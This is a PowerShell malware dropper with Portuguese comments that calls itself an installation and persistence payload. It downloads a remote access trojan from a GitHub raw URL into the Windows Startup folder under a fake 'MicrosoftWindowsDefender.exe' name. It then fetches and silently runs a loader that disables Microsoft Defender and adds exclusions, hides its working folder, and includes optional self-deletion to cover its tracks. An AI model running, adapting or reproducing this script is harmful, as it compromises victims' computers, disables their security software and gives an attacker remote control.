
# ==============================================================================
# PAYLOAD DE INSTALAÇÃO E PERSISTÊNCIA - MODO NINJA
# ==============================================================================

# 1. Definição de Variáveis e Caminhos
$urlBase = "https://raw.githubusercontent.com/thzinxa6/Instalation/refs/heads/main"
$tempPath = Join-Path $env:TEMP "MicrosoftDefenderCore"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$malFile = "$startupPath\MicrosoftWindowsDefender.exe"

# 2. Criação da estrutura de pastas ocultas no %TEMP%
if (!(Test-Path $tempPath)) {
    New-Item -ItemType Directory -Path $tempPath | Out-Null
    # Atribui o atributo 'Hidden' para a pasta não aparecer no Explorer
    (Get-Item $tempPath).Attributes = 'Hidden'
}

# 3. Downloads dos Componentes
# mal.exe: RAT que inicia na sessão do usuário para capturar o monitor
Invoke-WebRequest -Uri "$urlBase/mal.exe" -OutFile $malFile -ErrorAction SilentlyContinue

# DefendNot: Loader e DLL que desativam o Defender como SISTEMA
Invoke-WebRequest -Uri "$urlBase/defendnot-loader.exe" -OutFile "$tempPath\defendnot-loader.exe" -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri "$urlBase/defendnot.dll" -OutFile "$tempPath\defendnot.dll" -ErrorAction SilentlyContinue

# Pausa de segurança para garantir a escrita dos arquivos no disco
Start-Sleep -Seconds 2

# 4. Execução do RAT (mal.exe)
# Nota: "-WindowStyle Normal" permite que o Windows dispare o alerta do .NET 3.5.
# O "-Verb RunAs" garante que ele herde o token de Administrador do loader inicial.
Start-Process -FilePath $malFile -Verb RunAs -WindowStyle Normal

# 5. Execução do Loader de Segurança (DefendNot)
# Nota: Roda em segundo plano (--silent) e oculto para o usuário.
# Este componente aplicará as exclusões no Drive C:\ e nas extensões configuradas.
Start-Process -FilePath "$tempPath\defendnot-loader.exe" -ArgumentList "--silent" -WindowStyle Hidden

# 6. Limpeza de rastro do script (Opcional)
# Remove o próprio script após a execução, se necessário.
# Remove-Item $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
